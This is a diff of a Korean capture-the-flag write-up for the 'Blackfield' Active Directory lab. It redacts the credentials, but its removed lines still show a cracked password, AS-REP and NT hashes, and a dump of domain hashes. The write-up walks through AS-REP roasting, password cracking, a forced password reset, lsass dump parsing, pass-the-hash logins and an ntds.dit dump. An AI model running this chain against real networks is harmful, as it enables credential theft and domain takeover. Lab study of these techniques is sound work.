@@ -133,9 +133,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-$krb5asrep$23$support@BLACKFIELD.LOCAL:88deff28b96c9962c809da1167005064$8ebeef414ffb63b84e23f6692326eafaebd641077534f463b706a8227bdcd205a08a792cedd5c0f17a408d7cd3656d1acd2097abf83084b4916bd6545ded8294fcf67b3c8
-3ef9e44bae5ecb87b0ea4eb66a1de01065349e92b78f83110de7ce9243023af1506d7dd728f71c37aee50b127678bf0cd94ba0142c3979bf4e4286a327d17b76078877a78a693c7afd9bc564ba47355c39c559ef45e2f0409e7f070be5f8923edd02fb506e1216ad0
-030c3138e7911b3f1332fbd357953f198011a372a97a6a9df8cf766980dc1b3247d1b5940c7a693020205a5706ebf55b118a19b02efd8b5fa8b6860e180c83c89f6b0d69959299
+$krb5asrep$23$support@BLACKFIELD.LOCAL:88deff28b96c9962c809da1167005064$8ebeef414ffb63b84e23f6692326eafaebd6[REDACTED]
 ```
 
 저장한 이름들을 이용해 `AS-REP Roasting`을 진행하면, `support`유저가 취약한 것을 확인할 수 있고 해당 유저의 해시값이 출력된다.
@@ -146,7 +144,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
+[REDACTED]  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
 1g 0:00:00:17 DONE (2026-01-12 18:33) 0.05841g/s 837323p/s 837323c/s 837323C/s #13Carlyn..#*burberry#*1990
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -155,23 +153,23 @@ Session completed.
 해시값을 저장한 후, `john`을 이용해 크랙을 시도하면 다음과 같은 크리덴셜을 확보할 수 있다.:
 
 ```plain
-support:#00^BlackKnight
+support:[REDACTED]
 ```
 
 ### bloodhound
 
 ```bash
-└─$ bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local --zip -c All -ns 10.129.229.17
+└─$ bloodhound-python -u support -p '[REDACTED]' -d BLACKFIELD.local --zip -c All -ns 10.129.229.17
 ```
 
 획득한 크리덴셜을 사용하여 `bloodhound`를 통해 `support`유저는 `Audit2020`유저에 대해 비밀번호 변경 권한을 가지고있다.
 
-![bloodhound](assets/img/posts/Blackfield/bloodhound.png)
+![bloodhound](assets/img/posts/AD/Blackfield/bloodhound.png)
 
 ## Initial Access
 
 ```bash
-└─$ net rpc password "Audit2020" 'Chunsik!@#' -U "BLACKFIELD/support"%"#00^BlackKnight" -S 10.129.229.17
+└─$ net rpc password "Audit2020" 'Chunsik!@#' -U "BLACKFIELD/support"%"[REDACTED]" -S 10.129.229.17
 ```
 
 `net rpc`를 사용하여 `support`유저의 권한으로 `Audit2020`의 비밀번호를 변경한다.
@@ -257,7 +255,7 @@ luid 406458
                 Username: svc_backup
                 Domain: BLACKFIELD
                 LM: NA
-                NT: 9658d1d1dcd9250115e2205d9f48400d
+                NT: [REDACTED]
                 SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                 DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
         == WDIGEST [633ba]==
@@ -280,30 +278,30 @@ luid 406458
 압축을 해제하여 얻은 `lsass.DMP` 파일을 `pypykatz`를 이용해 메모리 덤프 파일에서 사용자의 로그인 비밀번호, 해시 등을 추출한다. 획득한 크리덴셜은 다음과 같다.:
 
 ```plain
-svc_backup:9658d1d1dcd9250115e2205d9f48400d
+svc_backup:[REDACTED]
 ```
 
 ```bash
-└─$ nxc smb 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+└─$ nxc smb 10.129.229.17 -u 'svc_backup' -H '[REDACTED]'
 SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
-SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:[REDACTED]
 ```
 
 `netexec`을 통해 smb 접근을 확인해 유효한 계정임을 확인했다.
 
 ```bash
-└─$ nxc winrm 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+└─$ nxc winrm 10.129.229.17 -u 'svc_backup' -H '[REDACTED]'
 WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
   arc4 = algorithms.ARC4(self._key)
-WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
-WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d zip() argument 2 is longer than argument 1
+WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:[REDACTED] (Pwn3d!)
+WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\svc_backup:[REDACTED] zip() argument 2 is longer than argument 1
 ```
 
 해당 계정은 `winrm`에 접근이 가능하기 때문에 `evil-winrm`을 사용하여 접근할 수 있다.
 
 ```bash
-└─$ evil-winrm -i BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+└─$ evil-winrm -i BLACKFIELD.local -u 'svc_backup' -H '[REDACTED]'
 
 Evil-WinRM shell v3.9
 
@@ -392,14 +390,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Searching for pekList, be patient                                                                                
 [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                          
 [*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                                            
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                     
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                       
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f48fd278cbd9beb6e5769a4047434c2d:::                                                                                                                                                            
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                            
-audit2020:1103:aad3b435b51404eeaad3b435b51404ee:b142c85d0bf06cffe26192e8cbd7de5c:::                                  
-support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                                                                                                                                          
-BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
-BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
 
 [ . . . ]
 ```
@@ -407,11 +398,11 @@ BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c
 다시 로컬로 돌아와 추출한 모든 파일을 이용하여 다시 해시를 추출하면 관리자 크리덴셜을 획득할 수 있다.:
 
 ```plain
-Administrator:184fb5e5178480be64824d4cd53b99ee
+Administrator:[REDACTED]
 ```
 
 ```bash
-└─$ evil-winrm -i Blackfield.local -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
+└─$ evil-winrm -i Blackfield.local -u 'Administrator' -H '[REDACTED]'
                                         
 Evil-WinRM shell v3.9
                                         
@@ -421,7 +412,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ~/Desktop/root.txt
-4375a629c7c67c8e29db269060c955cb
+[REDACTED]
 ```
 
 관리자 크리덴셜을 활용하여 대상 호스트에 접근한 후, 루트 플래그를 획득할 수 있다.
